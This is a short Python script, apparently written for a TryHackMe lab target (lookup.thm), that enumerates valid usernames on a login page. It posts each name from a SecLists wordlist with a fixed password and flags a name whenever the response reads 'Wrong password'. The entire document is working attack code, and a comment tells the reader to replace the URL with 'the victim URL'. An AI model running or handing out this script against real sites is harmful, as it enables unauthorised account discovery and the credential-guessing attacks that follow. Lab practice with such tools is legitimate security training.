## Category:    Enumeration
## Author:      Wolf of Sparta (@WolfofSparta)
## Date:        2025-02-08

## Title:       Username checker
## Description: Username discovery based on the login error message

import requests

# Define the target URL
url = "http://lookup.thm/login.php" # Change this with the victim URL!

# Define the file path containing usernames
file_path = "/usr/share/wordlists/SecLists/Usernames/Names/names.txt" # Change this if you want another username list! 

# Read the file and process each line
try:
    with open(file_path, "r") as file:
        for line in file:
            username = line.strip()
            if not username:
                continue  # Skip empty lines
            
            # Prepare the POST data
            data = {
                "username": username,
                "password": "password"  # Fixed password for testing
            }

            # Send the POST request
            response = requests.post(url, data=data)
            
            # Check the response content
            if "Wrong password" in response.text:
                print(f"Username found: {username}")
            elif "wrong username" in response.text:
                continue  # Silent continuation for wrong usernames
except FileNotFoundError:
    print(f"Error: The file {file_path} does not exist.")
except requests.RequestException as e:
    print(f"Error: An HTTP request error occurred: {e}")